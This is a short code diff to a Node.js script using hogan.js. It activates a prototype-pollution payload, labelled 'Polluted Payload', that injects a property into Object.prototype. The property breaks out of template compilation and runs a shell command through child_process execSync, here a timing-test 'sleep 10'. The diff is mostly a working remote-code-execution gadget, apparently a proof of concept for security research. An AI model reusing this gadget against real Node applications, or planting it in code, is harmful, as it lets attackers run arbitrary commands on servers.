@@ -3,10 +3,8 @@ const hogan = require("hogan.js");
 
 /* Polluted Payload*/
 // inject property to root prototype
-// Object.prototype.name = '2';
-// Object.prototype.inject = "},flag:process.mainModule.require(`child_process`).execSync(`sleep 10`).toString()}}//"
-
-// Object.prototype.inject = {}
+Object.prototype.name = '2';
+Object.prototype.inject = "},flag:process.mainModule.require(`child_process`).execSync(`sleep 10`).toString()}}//"
 
 const TEMPLATE = `
 <table border="1">
